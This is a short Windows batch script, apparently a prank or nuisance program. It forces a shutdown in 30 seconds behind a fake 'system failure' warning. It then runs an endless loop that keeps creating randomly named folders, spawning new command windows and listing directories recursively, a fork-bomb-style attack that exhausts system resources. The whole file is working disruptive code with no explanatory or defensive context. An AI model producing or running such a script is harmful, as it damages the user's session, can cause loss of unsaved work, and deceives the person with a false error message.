@echo off
mode 200
color 1a
shutdown -s -c "WINDOWS HAS DETECTED A SYSTEM FAILURE. SHUTTING DOWN TO PROTECT DATA." -t 30
:a
md %random%
start
dir /s
goto a